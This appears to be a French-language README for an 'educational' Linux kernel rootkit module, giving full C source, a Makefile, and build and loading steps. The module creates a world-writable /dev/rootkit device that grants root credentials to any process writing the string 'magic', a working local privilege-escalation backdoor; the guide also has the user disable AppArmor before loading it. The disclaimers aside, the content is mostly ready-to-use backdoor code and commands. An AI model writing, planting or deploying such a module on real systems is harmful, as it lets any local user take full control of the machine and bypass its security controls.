# Linux Kernel Rootkit Module — Privilege Escalation (Educational)

> **Disclaimer**  
> Ce module est uniquement destiné à l’**apprentissage** et à la **recherche en cybersécurité**.  
> Ne l’exécute que dans une **VM isolée** avec des snapshots.  
> Ne jamais utiliser en production : il modifie les **credentials kernel** et peut rendre ton système instable.  

---

## Description

Ce projet implémente un **Linux Kernel Module (LKM)** éducatif qui crée un **périphérique caractère** :  
`/dev/rootkit`  

- Écrire une chaîne **magique** déclenche une élévation de privilèges → l’utilisateur courant devient **root**.  
- Le module utilise un **misc device** pour simplifier l’implémentation.  

---

## Code Source

Fichier : `rootkit.c`

```c
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/miscdevice.h>
#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/printk.h>

#define MAGIC "magic"  // Magic string to trigger escalation

static ssize_t rootkit_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos) {
    char kbuf[16];
    size_t len = min(count, sizeof(kbuf) - 1);

    if (copy_from_user(kbuf, buf, len)) {
        pr_err("copy_from_user failed\n");
        return -EFAULT;
    }
    kbuf[len] = '\0';

    if (strncmp(kbuf, MAGIC, strlen(MAGIC)) == 0) {
        extern struct task_struct init_task;
        struct cred *new_cred = prepare_kernel_cred(&init_task);
        if (!new_cred) {
            pr_err("Failed to prepare kernel credentials\n");
            return -ENOMEM;
        }
        commit_creds(new_cred);
        pr_info("[+] Current process escalated to root\n");
    } else {
        pr_info("[-] Invalid magic string\n");
    }

    return count;
}

static const struct file_operations rootkit_fops = {
    .write = rootkit_write,
};

static struct miscdevice rootkit_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name = "rootkit",
    .fops = &rootkit_fops,
    .mode = 0666,
};

static int __init rootkit_init(void) {
    int ret = misc_register(&rootkit_dev);
    if (ret) {
        pr_err("Failed to register misc device\n");
        return ret;
    }
    pr_info("Rootkit device loaded: /dev/rootkit\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    misc_deregister(&rootkit_dev);
    pr_info("Rootkit device unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Me");
MODULE_DESCRIPTION("Educational rootkit module with char device for privilege escalation");
```

---

## Préparation de l’Environnement

Installer les headers du kernel :  
```bash
sudo apt update && sudo apt install linux-headers-$(uname -r)
```

Créer un **Makefile** :  
```makefile
obj-m += rootkit.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

---

## Compilation & Chargement

1. Désactiver temporairement AppArmor (si activé) :  
   ```bash
   sudo systemctl disable --now apparmor
   ```

   Pour le réactiver :  
   ```bash
   sudo systemctl enable --now apparmor
   ```

2. Compiler le module :  
   ```bash
   make
   ```

3. Charger le module :  
   ```bash
   sudo insmod rootkit.ko
   ```

4. Vérifier que le périphérique existe :  
   ```bash
   ls /dev/rootkit
   ```

---

## Exploitation (Test)

Écrire la chaîne magique pour escalader :  
```bash
echo "magic" > /dev/rootkit
```

Vérifier l’identité :  
```bash
id
```

---

> ✨ Utilisation strictement pédagogique.  
> ⚠️ À tester uniquement dans un **environnement contrôlé**.

